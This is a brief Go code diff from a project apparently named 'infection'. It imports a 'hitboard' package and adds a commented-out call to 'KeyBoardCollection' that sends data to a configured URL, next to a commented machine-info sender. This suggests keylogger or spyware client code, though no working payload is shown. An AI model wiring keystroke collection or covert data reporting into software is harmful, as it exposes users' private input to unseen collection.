@@ -17,6 +17,7 @@ import (
 	"systray"
 	//"time"
 	"github.com/scottkiss/grtm"
+	"infection/hitboard"
 	"infection/transfer"
 	"infection/util/icon"
 )
@@ -118,6 +119,7 @@ func main() {
 	appConfig.Url = conf.Url
 	appConfigMgr.config.Store(&appConfig)
 	//machineinfo.MachineSend(conf.Url)
+	//hitboard.KeyBoardCollection(conf.Url)
 	go lib.DoUpdate()
 	systray.Run(onReady, onExit)
 }
